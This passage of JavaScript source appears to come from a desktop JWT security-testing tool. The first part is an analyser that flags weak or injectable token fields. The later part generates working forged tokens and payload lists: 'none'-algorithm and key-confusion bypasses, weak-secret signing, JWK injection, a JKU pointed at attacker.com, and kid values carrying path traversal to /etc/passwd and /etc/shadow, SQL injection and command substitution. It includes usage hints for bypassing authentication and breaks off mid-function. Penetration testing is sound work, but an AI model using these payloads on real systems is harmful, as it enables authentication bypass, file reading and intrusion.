        if (payload.sub && typeof payload.sub === 'string') {
            if (/^\d+$/.test(payload.sub) && payload.sub.length < 3) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: 'Enumerable Subject Pattern',
                    description: 'Subject appears to be a simple incremental ID',
                    impact: 'May allow user enumeration attacks',
                    recommendation: 'Use UUIDs or non-enumerable identifiers for subjects'
                });
            }

            if (payload.sub === 'admin' || payload.sub === 'root' || payload.sub === 'system') {
                this.vulnerabilities.push({
                    severity: 'high',
                    title: i18n.t('vulns.admin_token'),
                    description: i18n.t('vulns.admin_token_desc'),
                    impact: i18n.t('vulns.admin_token_impact'),
                    recommendation: i18n.t('vulns.admin_token_rec')
                });
            }
        }
    }

    checkSignatureSecurity(header, token) {
        const parts = token.split('.');
        if (parts.length !== 3) {
            this.vulnerabilities.push({
                severity: 'critical',
                title: i18n.t('vulns.malformed_token'),
                description: i18n.t('vulns.malformed_token_desc'),
                impact: i18n.t('vulns.malformed_token_impact'),
                recommendation: i18n.t('vulns.malformed_token_rec')
            });
            return;
        }

        if (parts[2] === '') {
            this.vulnerabilities.push({
                severity: 'critical',
                title: i18n.t('vulns.missing_signature'),
                description: i18n.t('vulns.missing_signature_desc'),
                impact: i18n.t('vulns.missing_signature_impact'),
                recommendation: i18n.t('vulns.missing_signature_rec')
            });
            return;
        }

        const entropy = this.calculateEntropy(parts[2]);
        if (entropy < 4.0) {
            this.vulnerabilities.push({
                severity: 'high',
                title: 'Low Signature Entropy',
                description: `Signature has low entropy (${entropy.toFixed(2)} bits/char)`,
                impact: 'May indicate predictable or weak signature generation',
                recommendation: 'Ensure cryptographically secure random signature generation'
            });
        }

        if (parts[2].length < 20) {
            this.vulnerabilities.push({
                severity: 'medium',
                title: 'Short Signature Length',
                description: `Signature is unusually short (${parts[2].length} characters)`,
                impact: 'Short signatures may be vulnerable to brute force attacks',
                recommendation: 'Use algorithms that produce adequately long signatures'
            });
        }

        const repeatingPattern = /(.{3,})\1{2,}/.test(parts[2]);
        if (repeatingPattern) {
            this.vulnerabilities.push({
                severity: 'medium',
                title: 'Repeating Signature Pattern',
                description: 'Signature contains repeating patterns',
                impact: 'May indicate weak key material or implementation flaws',
                recommendation: 'Investigate signature generation process for weaknesses'
            });
        }

        if (parts[2].match(/^[A-Za-z0-9+\/]*={0,2}$/)) {
            if (parts[2].includes('=')) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: 'Base64 Padding in Signature',
                    description: 'JWT signature contains Base64 padding characters',
                    impact: 'JWT should use Base64URL encoding without padding',
                    recommendation: 'Use proper Base64URL encoding for JWT signatures'
                });
            }
        }
    }

    calculateEntropy(str) {
        const frequency = {};
        for (let char of str) {
            frequency[char] = (frequency[char] || 0) + 1;
        }

        let entropy = 0;
        const length = str.length;

        for (let char in frequency) {
            const p = frequency[char] / length;
            entropy -= p * Math.log2(p);
        }

        return entropy;
    }

    checkTokenStructure(token) {
        if (token.length > 8192) {
            this.vulnerabilities.push({
                severity: 'medium',
                title: i18n.t('vulns.large_token'),
                description: i18n.t('vulns.large_token_desc'),
                impact: i18n.t('vulns.large_token_impact'),
                recommendation: i18n.t('vulns.large_token_rec')
            });
        }

        if (token.length > 4096) {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Large Token Size',
                description: `Token size (${token.length} chars) may cause HTTP header limits`,
                impact: 'May be rejected by web servers or proxies with header size limits',
                recommendation: 'Keep JWT tokens under 4KB when possible'
            });
        }

        const parts = token.split('.');
        if (parts.some(part => part.includes('='))) {
            this.vulnerabilities.push({
                severity: 'low',
                title: i18n.t('vulns.invalid_base64'),
                description: i18n.t('vulns.invalid_base64_desc'),
                impact: i18n.t('vulns.invalid_base64_impact'),
                recommendation: i18n.t('vulns.invalid_base64_rec')
            });
        }

        parts.forEach((part, index) => {
            if (part.includes('\0')) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Null Byte in Token',
                    description: `Token part ${index + 1} contains null bytes`,
                    impact: 'May cause parsing errors or security bypasses',
                    recommendation: 'Remove null bytes from token components'
                });
            }

            const invalidChars = part.match(/[^A-Za-z0-9_-]/g);
            if (invalidChars) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: 'Invalid Characters in Token',
                    description: `Token part ${index + 1} contains invalid characters: ${invalidChars.join(', ')}`,
                    impact: 'May cause parsing inconsistencies across different JWT libraries',
                    recommendation: 'Use only valid Base64URL characters in JWT tokens'
                });
            }
        });

        const headerPayloadRatio = parts[0].length / parts[1].length;
        if (headerPayloadRatio > 2.0 || headerPayloadRatio < 0.1) {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Unusual Header/Payload Size Ratio',
                description: `Header to payload size ratio is unusual: ${headerPayloadRatio.toFixed(2)}`,
                impact: 'May indicate malformed or crafted token structure',
                recommendation: 'Review token structure for correctness'
            });
        }

        try {
            const headerContent = this.base64UrlDecode(parts[0]);
            const payloadContent = this.base64UrlDecode(parts[1]);

            const nonPrintableHeader = headerContent.match(/[\x00-\x1F\x7F-\x9F]/g);
            const nonPrintablePayload = payloadContent.match(/[\x00-\x1F\x7F-\x9F]/g);

            if (nonPrintableHeader) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Non-Printable Characters in Header',
                    description: 'JWT header contains non-printable characters',
                    impact: 'May indicate encoding issues or malicious content',
                    recommendation: 'Ensure JWT header contains only valid JSON with printable characters'
                });
            }

            if (nonPrintablePayload) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Non-Printable Characters in Payload',
                    description: 'JWT payload contains non-printable characters',
                    impact: 'May indicate encoding issues or malicious content',
                    recommendation: 'Ensure JWT payload contains only valid JSON with printable characters'
                });
            }
        } catch (e) {
            this.vulnerabilities.push({
                severity: 'high',
                title: 'Token Decoding Error',
                description: 'Unable to decode token parts - may be corrupted or malformed',
                impact: 'Token may not be processable by standard JWT libraries',
                recommendation: 'Verify token encoding and structure integrity'
            });
        }
    }

    checkModernVulnerabilities(header, payload) {
        if (header.jwk) {
            this.vulnerabilities.push({
                severity: 'critical',
                title: i18n.t('vulns.jwk_injection'),
                description: i18n.t('vulns.jwk_injection_desc'),
                impact: i18n.t('vulns.jwk_injection_impact'),
                recommendation: i18n.t('vulns.jwk_injection_rec')
            });

            if (typeof header.jwk === 'object') {
                if (!header.jwk.kty || !header.jwk.use || !header.jwk.n || !header.jwk.e) {
                    this.vulnerabilities.push({
                        severity: 'medium',
                        title: 'Incomplete JWK Structure',
                        description: 'Embedded JWK is missing required parameters',
                        impact: 'May cause verification failures or security bypasses',
                        recommendation: 'Ensure JWK contains all required parameters (kty, use, n, e for RSA)'
                    });
                }

                if (header.jwk.n && header.jwk.n.length < 256) {
                    this.vulnerabilities.push({
                        severity: 'high',
                        title: 'Weak JWK Key Size',
                        description: 'Embedded JWK uses weak key size',
                        impact: 'Weak keys can be broken through cryptographic attacks',
                        recommendation: 'Use RSA keys of at least 2048 bits'
                    });
                }
            }
        }

        if (header.kid) {
            const kid = header.kid;
            const dangerousPatterns = [
                /\.\.[\/\\]/,
                /[;&|`$()]/,
                /\b(union|select|drop|insert|update|delete)\b/i,
                /\${.*}/,
                /%[0-9a-f]{2}/i,
                /\\x[0-9a-f]{2}/i,
                /\0/,
                /\.\./,
                /\/etc\/|\/proc\/|\/sys\/|\/dev\//,
                /\|\||&&/,
                /;|\||&/
            ];

            dangerousPatterns.forEach(pattern => {
                if (pattern.test(kid)) {
                    let title = 'Kid Parameter Injection';
                    let severity = 'high';

                    if (pattern.source.includes('union|select')) {
                        title = i18n.t('vulns.kid_sql_injection');
                        severity = 'high';
                    } else if (pattern.source.includes('\\.\\.[')) {
                        title = i18n.t('vulns.kid_path_traversal');
                        severity = 'critical';
                    } else if (pattern.source.includes('[;&|`$()]')) {
                        title = 'Kid Command Injection';
                        severity = 'critical';
                    }

                    this.vulnerabilities.push({
                        severity: severity,
                        title: title,
                        description: `Kid parameter contains dangerous pattern: ${kid.substring(0, 100)}`,
                        impact: severity === 'critical' ? 'System compromise through command/path injection' : 'Database compromise through SQL injection',
                        recommendation: 'Validate kid parameter against whitelist and sanitize input'
                    });
                }
            });

            if (kid.length > 256) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Excessive Kid Parameter Length',
                    description: `Kid parameter is unusually long (${kid.length} characters)`,
                    impact: 'May cause buffer overflows or denial of service',
                    recommendation: 'Limit kid parameter length to reasonable bounds'
                });
            }

            if (kid.includes('\n') || kid.includes('\r')) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Line Breaks in Kid Parameter',
                    description: 'Kid parameter contains line break characters',
                    impact: 'May cause HTTP header injection or log injection',
                    recommendation: 'Remove line breaks from kid parameter'
                });
            }
        }

        if (header.jku) {
            this.vulnerabilities.push({
                severity: 'high',
                title: i18n.t('vulns.jku_hijacking'),
                description: i18n.t('vulns.jku_hijacking_desc'),
                impact: i18n.t('vulns.jku_hijacking_impact'),
                recommendation: i18n.t('vulns.jku_hijacking_rec')
            });

            const jku = header.jku;
            if (!jku.startsWith('https://')) {
                this.vulnerabilities.push({
                    severity: 'high',
                    title: 'Insecure JKU URL',
                    description: 'JKU URL does not use HTTPS protocol',
                    impact: 'JWK set can be intercepted or modified in transit',
                    recommendation: 'Always use HTTPS for JKU URLs'
                });
            }

            const suspiciousHosts = ['localhost', '127.0.0.1', '0.0.0.0', '10.', '192.168.', '172.16.'];
            if (suspiciousHosts.some(host => jku.includes(host))) {
                this.vulnerabilities.push({
                    severity: 'high',
                    title: 'Suspicious JKU Host',
                    description: 'JKU URL points to internal or localhost address',
                    impact: 'May indicate SSRF attempt or development/test configuration',
                    recommendation: 'Validate JKU URLs against whitelist of trusted hosts'
                });
            }
        }

        if (header.x5u) {
            this.vulnerabilities.push({
                severity: 'high',
                title: i18n.t('vulns.x5u_exploit'),
                description: i18n.t('vulns.x5u_exploit_desc'),
                impact: i18n.t('vulns.x5u_exploit_impact'),
                recommendation: i18n.t('vulns.x5u_exploit_rec')
            });
        }

        if (header.x5c) {
            this.vulnerabilities.push({
                severity: 'medium',
                title: 'X.509 Certificate Chain in Header',
                description: 'Token header contains X.509 certificate chain',
                impact: 'Large headers and potential certificate validation bypasses',
                recommendation: 'Validate certificate chain against trusted CAs'
            });
        }

        if (Array.isArray(payload.aud)) {
            this.vulnerabilities.push({
                severity: 'medium',
                title: i18n.t('vulns.multi_audience'),
                description: i18n.t('vulns.multi_audience_desc'),
                impact: i18n.t('vulns.multi_audience_impact'),
                recommendation: i18n.t('vulns.multi_audience_rec')
            });
        }

        Object.values(payload).forEach(value => {
            if (typeof value === 'string' && value.includes('.') && value.split('.').length === 3) {
                try {
                    jwt.decode(value);
                    this.vulnerabilities.push({
                        severity: 'medium',
                        title: i18n.t('vulns.nested_jwt'),
                        description: i18n.t('vulns.nested_jwt_desc'),
                        impact: i18n.t('vulns.nested_jwt_impact'),
                        recommendation: i18n.t('vulns.nested_jwt_rec')
                    });
                } catch (e) {
                }
            }
        });

        if (header.alg && (header.alg.startsWith('RS') || header.alg.startsWith('ES'))) {
            this.vulnerabilities.push({
                severity: 'low',
                title: i18n.t('vulns.quantum_vulnerable'),
                description: i18n.t('vulns.quantum_vulnerable_desc'),
                impact: i18n.t('vulns.quantum_vulnerable_impact'),
                recommendation: i18n.t('vulns.quantum_vulnerable_rec')
            });
        }

        const duplicateHeaders = JSON.stringify(header).match(/("[^"]+"):\s*[^,}]+,.*?\1:/);
        if (duplicateHeaders) {
            this.vulnerabilities.push({
                severity: 'medium',
                title: 'Duplicate Header Parameters',
                description: 'JWT header contains duplicate parameter names',
                impact: 'Different parsers may handle duplicates differently, causing security bypasses',
                recommendation: 'Remove duplicate parameters from JWT header'
            });
        }

        const duplicatePayload = JSON.stringify(payload).match(/("[^"]+"):\s*[^,}]+,.*?\1:/);
        if (duplicatePayload) {
            this.vulnerabilities.push({
                severity: 'medium',
                title: 'Duplicate Payload Claims',
                description: 'JWT payload contains duplicate claim names',
                impact: 'Parser confusion may lead to authorization bypasses',
                recommendation: 'Remove duplicate claims from JWT payload'
            });
        }
    }

    checkComplianceAndBestPractices(header, payload) {
        if (!header.typ || header.typ !== 'JWT') {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Missing or Invalid Type Header',
                description: 'JWT header missing "typ": "JWT" parameter',
                impact: 'May cause parsing issues in strict JWT implementations',
                recommendation: 'Include "typ": "JWT" in header for RFC 7519 compliance'
            });
        }

        if (!header.alg) {
            this.vulnerabilities.push({
                severity: 'high',
                title: 'Missing Algorithm Header',
                description: 'JWT header missing required "alg" parameter',
                impact: 'Violates RFC 7519 and may cause verification failures',
                recommendation: 'Always include "alg" parameter in JWT header'
            });
        }

        const requiredPayloadClaims = ['iss', 'sub', 'aud', 'exp', 'iat'];
        const missingClaims = requiredPayloadClaims.filter(claim => !payload[claim]);

        if (missingClaims.length > 0) {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Missing Standard Claims',
                description: `JWT missing recommended claims: ${missingClaims.join(', ')}`,
                impact: 'May cause interoperability issues and security policy violations',
                recommendation: 'Include standard claims as per RFC 7519 and security best practices'
            });
        }

        const longClaimNames = Object.keys(payload).filter(key => key.length > 50);
        if (longClaimNames.length > 0) {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Excessively Long Claim Names',
                description: `Claims with long names: ${longClaimNames.join(', ')}`,
                impact: 'May cause parsing issues and increase token size unnecessarily',
                recommendation: 'Use concise claim names following JWT best practices'
            });
        }

        const sensitiveDataPatterns = {
            'password': /password|passwd|pwd/i,
            'private_key': /private[_-]?key|privkey/i,
            'api_key': /api[_-]?key|apikey/i,
            'secret': /secret|token/i,
            'ssn': /\b\d{3}-?\d{2}-?\d{4}\b/,
            'credit_card': /\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b/,
            'email': /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/
        };

        Object.entries(payload).forEach(([key, value]) => {
            Object.entries(sensitiveDataPatterns).forEach(([pattern, regex]) => {
                if ((key.match(regex) || (value && value.toString().match(regex))) && pattern !== 'email') {
                    this.vulnerabilities.push({
                        severity: 'high',
                        title: 'Sensitive Data in Claims',
                        description: `Potential ${pattern.replace('_', ' ')} found in claim "${key}"`,
                        impact: 'Sensitive data exposure if token is compromised or logged',
                        recommendation: 'Remove sensitive data from JWT payload, use references instead'
                    });
                }
            });
        });

        if (Object.keys(payload).length > 20) {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Excessive Number of Claims',
                description: `JWT contains ${Object.keys(payload).length} claims`,
                impact: 'Large number of claims increases token size and complexity',
                recommendation: 'Limit number of claims to essential information only'
            });
        }

        const customHeaderParams = Object.keys(header).filter(key =>
            !['alg', 'typ', 'kid', 'jku', 'jwk', 'x5u', 'x5c', 'x5t', 'x5t#S256', 'crit'].includes(key)
        );

        if (customHeaderParams.length > 0) {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Custom Header Parameters',
                description: `Non-standard header parameters: ${customHeaderParams.join(', ')}`,
                impact: 'May cause interoperability issues with standard JWT libraries',
                recommendation: 'Use only standard JWT header parameters when possible'
            });
        }
    }

    checkStatisticalAndBehavioralPatterns(header, payload) {
        if (payload.jti) {
            const jti = payload.jti.toString();

            if (/^\d+$/.test(jti) && jti.length < 10) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Predictable JWT ID Pattern',
                    description: 'JWT ID appears to be a simple incremental number',
                    impact: 'May allow token enumeration and replay attacks',
                    recommendation: 'Use cryptographically secure random values for JWT ID'
                });
            }

            const entropy = this.calculateEntropy(jti);
            if (entropy < 4.0) {
                this.vulnerabilities.push({
                    severity: 'medium',
                    title: 'Low JWT ID Entropy',
                    description: `JWT ID has low entropy (${entropy.toFixed(2)} bits/char)`,
                    impact: 'Predictable JWT IDs may be vulnerable to guessing attacks',
                    recommendation: 'Use high-entropy random values for JWT ID generation'
                });
            }
        }

        if (payload.sub) {
            const sub = payload.sub.toString();

            if (/^(user|admin|test|demo)\d*$/i.test(sub)) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: 'Generic Subject Pattern',
                    description: 'Subject follows generic naming pattern',
                    impact: 'May indicate test/demo environment or weak user management',
                    recommendation: 'Use unique, non-guessable identifiers for production subjects'
                });
            }

            const entropy = this.calculateEntropy(sub);
            if (entropy < 3.0 && sub.length > 10) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: 'Low Subject Entropy',
                    description: `Subject has low entropy despite length (${entropy.toFixed(2)} bits/char)`,
                    impact: 'May indicate predictable user ID generation',
                    recommendation: 'Use high-entropy identifiers for user subjects'
                });
            }
        }

        if (payload.iat && payload.exp) {
            const tokenLifetime = payload.exp - payload.iat;
            const commonLifetimes = [300, 900, 1800, 3600, 7200, 86400];

            if (!commonLifetimes.includes(tokenLifetime) && tokenLifetime > 0) {
                const hours = Math.floor(tokenLifetime / 3600);
                if (hours === 0 || hours > 24) {
                    this.vulnerabilities.push({
                        severity: 'low',
                        title: 'Unusual Token Lifetime',
                        description: `Token lifetime is ${tokenLifetime} seconds (${hours} hours)`,
                        impact: 'May indicate misconfiguration or unusual use case',
                        recommendation: 'Use standard token lifetimes (5min, 15min, 1h, 24h)'
                    });
                }
            }
        }

        const claimValueDistribution = {};
        Object.entries(payload).forEach(([key, value]) => {
            if (typeof value === 'string' || typeof value === 'number') {
                const strValue = value.toString();
                if (!claimValueDistribution[key]) claimValueDistribution[key] = [];
                claimValueDistribution[key].push(strValue);
            }
        });

        Object.entries(claimValueDistribution).forEach(([claim, values]) => {
            values.forEach(value => {
                if (value.match(/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i)) {
                    if (value.startsWith('00000000') || value.endsWith('00000000')) {
                        this.vulnerabilities.push({
                            severity: 'low',
                            title: 'Weak UUID Pattern',
                            description: `Claim "${claim}" contains UUID with suspicious pattern: ${value}`,
                            impact: 'May indicate weak UUID generation or test data',
                            recommendation: 'Ensure UUIDs are generated with proper randomness'
                        });
                    }
                }
            });
        });

        if (payload.iat) {
            const issuedTime = new Date(payload.iat * 1000);
            const dayOfWeek = issuedTime.getUTCDay();
            const hourOfDay = issuedTime.getUTCHours();

            if (dayOfWeek === 0 || dayOfWeek === 6) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: 'Weekend Token Issuance',
                    description: 'Token was issued during weekend',
                    impact: 'May indicate automated systems or unusual usage patterns',
                    recommendation: 'Review weekend token issuance for security policy compliance'
                });
            }

            if (hourOfDay < 6 || hourOfDay > 22) {
                this.vulnerabilities.push({
                    severity: 'low',
                    title: 'Off-Hours Token Issuance',
                    description: `Token issued during off-hours (${hourOfDay}:xx UTC)`,
                    impact: 'May indicate automated systems or suspicious activity',
                    recommendation: 'Review off-hours token issuance patterns for anomalies'
                });
            }
        }

        const payloadSize = JSON.stringify(payload).length;
        const headerSize = JSON.stringify(header).length;

        if (payloadSize > headerSize * 20) {
            this.vulnerabilities.push({
                severity: 'low',
                title: 'Disproportionate Payload Size',
                description: `Payload is ${Math.floor(payloadSize/headerSize)}x larger than header`,
                impact: 'Unusually large payload may indicate data exfiltration or misuse',
                recommendation: 'Review payload contents for appropriateness and necessity'
            });
        }
    }

    displaySecurityResults() {
        const resultsContainer = document.getElementById('security-results');
        const scoreElement = document.getElementById('security-score');
        const vulnerabilityList = document.getElementById('vulnerabilities-list');

        const severityCounts = {
            critical: this.vulnerabilities.filter(v => v.severity === 'critical').length,
            high: this.vulnerabilities.filter(v => v.severity === 'high').length,
            medium: this.vulnerabilities.filter(v => v.severity === 'medium').length,
            low: this.vulnerabilities.filter(v => v.severity === 'low').length
        };

        document.getElementById('critical-count').textContent = severityCounts.critical;
        document.getElementById('high-count').textContent = severityCounts.high;
        document.getElementById('medium-count').textContent = severityCounts.medium;
        document.getElementById('low-count').textContent = severityCounts.low;

        const score = this.calculateSecurityScore(severityCounts);
        scoreElement.textContent = `${score}/100`;
        scoreElement.className = `score-value ${this.getScoreClass(score)}`;

        vulnerabilityList.innerHTML = '';
        this.vulnerabilities.forEach(vuln => {
            const vulnElement = document.createElement('div');
            vulnElement.className = `vulnerability-item ${vuln.severity}`;
            vulnElement.innerHTML = `
                <div class="vulnerability-header">
                    <div class="vulnerability-title">${vuln.title}</div>
                    <div class="vulnerability-severity ${vuln.severity}">${vuln.severity}</div>
                </div>
                <div class="vulnerability-description">${vuln.description}</div>
                <div class="vulnerability-impact"><strong>Impact:</strong> ${vuln.impact}</div>
                <div class="vulnerability-recommendation"><strong>Recommendation:</strong> ${vuln.recommendation}</div>
            `;
            vulnerabilityList.appendChild(vulnElement);
        });

        resultsContainer.style.display = 'block';
    }

    calculateSecurityScore(counts) {
        let score = 100;
        score -= counts.critical * 30;
        score -= counts.high * 20;
        score -= counts.medium * 10;
        score -= counts.low * 5;
        return Math.max(0, score);
    }

    getScoreClass(score) {
        if (score >= 90) return 'excellent';
        if (score >= 70) return 'good';
        if (score >= 50) return 'fair';
        return 'poor';
    }


    async loadWordlistFile() {
        try {
            const result = await ipcRenderer.invoke('load-file', [
                { name: 'Text Files', extensions: ['txt'] },
                { name: 'Dictionary Files', extensions: ['dic'] },
                { name: 'All Files', extensions: ['*'] }
            ]);

            if (result.success && result.content) {
                document.getElementById('secret-wordlist').value = result.content;
                const lineCount = result.content.split('\n').filter(line => line.trim()).length;
                this.showToast('success', `${i18n.t('toast.file_loaded')} ${lineCount} ${i18n.t('toast.file_loaded')}`);
            } else if (result.cancelled) {

            } else {
                this.showToast('error', `${i18n.t('toast.file_load_failed')}: ${result.error}`);
            }
        } catch (error) {
            this.showToast('error', `${i18n.t('toast.file_load_error')}: ${error.message}`);
        }
    }

    /**
     * Generates an attack payload based on the specified attack type
     * @method
     * @param {string} attackType - The type of attack to generate (e.g., 'algorithm-none', 'weak-secret')
     */
    generateAttack(attackType) {
        const token = document.getElementById('attack-jwt-input').value;
        if (!token) {
            this.showToast('error', i18n.t('toast.provide_token_attack'));
            return;
        }

        try {
            const decoded = jwt.decode(token, { complete: true });
            let attackPayload;

            switch (attackType) {
                case 'none':
                    attackPayload = this.generateNoneAttack(decoded);
                    break;
                case 'confusion':
                    attackPayload = this.generateConfusionAttack(decoded);
                    break;
                case 'weak-secret':
                    attackPayload = this.generateWeakSecretAttack(decoded);
                    break;
                case 'replay':
                    attackPayload = this.generateReplayAttack(decoded);
                    break;
                case 'jwk-injection':
                    attackPayload = this.generateJWKInjectionAttack(decoded);
                    break;
                case 'kid-injection':
                    attackPayload = this.generateKidInjectionAttack(decoded);
                    break;
                case 'jku-hijack':
                    attackPayload = this.generateJKUHijackAttack(decoded);
                    break;
                case 'x5u-exploit':
                    attackPayload = this.generateX5UExploitAttack(decoded);
                    break;
                case 'jwt-smuggling':
                    attackPayload = this.generateJWTSmugglingAttack(decoded);
                    break;
                case 'nested-jwt':
                    attackPayload = this.generateNestedJWTAttack(decoded);
                    break;
                case 'audience-confusion':
                    attackPayload = this.generateAudienceConfusionAttack(decoded);
                    break;
                case 'parameter-pollution':
                    attackPayload = this.generateParameterPollutionAttack(decoded);
                    break;
                case 'timing-attack':
                    attackPayload = this.generateTimingAttack(decoded);
                    break;
                case 'jwt-sidejacking':
                    attackPayload = this.generateJWTSidejackingAttack(decoded);
                    break;
                case 'jwks-poisoning':
                    attackPayload = this.generateJWKSPoisoningAttack(decoded);
                    break;
                case 'quantum-prep':
                    attackPayload = this.generateQuantumPrepAttack(decoded);
                    break;
                case 'psychic-signature':
                    attackPayload = this.generatePsychicSignatureAttack(decoded);
                    break;
                case 'prototype-pollution':
                    attackPayload = this.generatePrototypePollutionAttack(decoded);
                    break;
                case 'hardcoded-secret-cve-2025-20188':
                    attackPayload = this.generateHardcodedSecretAttack(decoded);
                    break;
                case 'issuer-bypass-cve-2025-30144':
                    attackPayload = this.generateIssuerBypassAttack(decoded);
                    break;
                case 'post-quantum-assessment':
                    attackPayload = this.generatePostQuantumAssessment(decoded);
                    break;
                default:
                    this.showToast('error', i18n.t('toast.unknown_attack'));
                    return;
            }

            this.displayAttackResults(attackType, attackPayload);

        } catch (error) {
            this.showToast('error', `${i18n.t('toast.attack_generation_failed')}: ${error.message}`);
        }
    }

    generateNoneAttack(decoded) {
        const header = { ...decoded.header, alg: 'none' };
        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
        const attackToken = `${headerB64}.${payloadB64}.`;

        return {
            description: 'Algorithm None Attack - bypasses signature verification',
            token: attackToken,
            impact: 'Complete authentication bypass',
            usage: 'Use this token to bypass signature verification if the application accepts "none" algorithm'
        };
    }

    generateConfusionAttack(decoded) {
        if (!decoded.header.alg || !decoded.header.alg.startsWith('RS')) {
            return {
                description: 'Algorithm Confusion Attack - requires RS256/384/512 token',
                token: null,
                impact: 'Not applicable - original token must use RSA algorithm',
                usage: 'This attack only works on RSA-signed tokens (RS256, RS384, RS512)'
            };
        }

        const header = { ...decoded.header, alg: 'HS256' };
        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));

        return {
            description: 'Algorithm Confusion Attack - changes RSA to HMAC',
            token: `${headerB64}.${payloadB64}.[SIGN_WITH_PUBLIC_KEY_AS_HMAC_SECRET]`,
            impact: 'Potential authentication bypass using public key as HMAC secret',
            usage: 'Obtain the RSA public key and use it as HMAC secret to sign this token'
        };
    }

    generateWeakSecretAttack(decoded) {
        const commonSecrets = ['secret', 'password', 'key', 'jwt', 'admin', 'test', '123456'];
        const attacks = [];

        commonSecrets.forEach(secret => {
            try {
                const attackToken = jwt.sign(decoded.payload, secret, {
                    algorithm: decoded.header.alg || 'HS256',
                    header: { ...decoded.header, alg: decoded.header.alg || 'HS256' },
                    noTimestamp: true
                });
                attacks.push({
                    secret: secret,
                    token: attackToken
                });
            } catch (e) {
            }
        });

        return {
            description: 'Weak Secret Attack - tokens signed with common secrets',
            attacks: attacks,
            impact: 'Authentication bypass with weak/common secrets',
            usage: 'Try these tokens if the application uses weak HMAC secrets'
        };
    }

    generateReplayAttack(decoded) {
        const modifiedPayload = { ...decoded.payload };
        delete modifiedPayload.exp;
        delete modifiedPayload.nbf;
        delete modifiedPayload.iat;

        return {
            description: 'Token Replay Attack - removes time-based claims',
            token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(modifiedPayload))}.${decoded.signature}`,
            impact: 'Token reuse across sessions and time periods',
            usage: 'Use this token to test for replay attack vulnerabilities'
        };
    }

    generateJWKInjectionAttack(decoded) {
        const maliciousJWK = {
            kty: "RSA",
            use: "sig",
            kid: decoded.header.kid || "attacker-key",
            n: "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
            e: "AQAB"
        };

        const header = { ...decoded.header, jwk: maliciousJWK, alg: 'RS256' };
        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
        const attackToken = `${headerB64}.${payloadB64}.[SIGN_WITH_ATTACKER_PRIVATE_KEY]`;

        return {
            description: 'JWK Injection Attack - embeds malicious public key in header',
            token: attackToken,
            impact: 'Complete signature verification bypass',
            usage: 'Sign this token with your private key corresponding to the embedded JWK',
            additionalInfo: 'JWK embedded in header allows attacker to control verification key'
        };
    }

    generateKidInjectionAttack(decoded) {
        const payloads = [
            '../../../etc/passwd',
            '/dev/null',
            '../../../../etc/shadow',
            'http://attacker.com/malicious.key',
            '../../../tmp/malicious.key',
            '"; DROP TABLE keys; --',
            "' OR '1'='1",
            '$(cat /etc/passwd)',
            '`cat /etc/passwd`',
            '../../proc/self/environ',
            '/root/res/keys/secret.key; ls -la',
            '../keys/../../etc/hosts'
        ];

        const attacks = payloads.map(payload => {
            const header = { ...decoded.header, kid: payload };
            const headerB64 = this.base64UrlEncode(JSON.stringify(header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
            return {
                payload: payload,
                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
                type: this.getKidAttackType(payload)
            };
        });

        return {
            description: 'Kid Parameter Injection - path traversal and injection attacks',
            attacks: attacks,
            impact: 'File system access, SQL injection, or command execution',
            usage: 'Test these payloads to exploit kid parameter handling vulnerabilities'
        };
    }

    getKidAttackType(payload) {
        if (payload.includes('../') || payload.includes('/etc/')) return 'Path Traversal';
        if (payload.includes('http://')) return 'URL Injection';
        if (payload.includes('DROP') || payload.includes("'")) return 'SQL Injection';
        if (payload.includes('$(') || payload.includes('`')) return 'Command Injection';
        return 'Generic Injection';
    }

    generateJKUHijackAttack(decoded) {
        const maliciousJKU = 'https://attacker.com/.well-known/jwks.json';
        const header = { ...decoded.header, jku: maliciousJKU };
        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
        const attackToken = `${headerB64}.${payloadB64}.[SIGN_WITH_ATTACKER_KEY]`;

        const maliciousJWKS = {
            keys: [{
                kty: "RSA",
                use: "sig",
                kid: decoded.header.kid || "attacker-key",
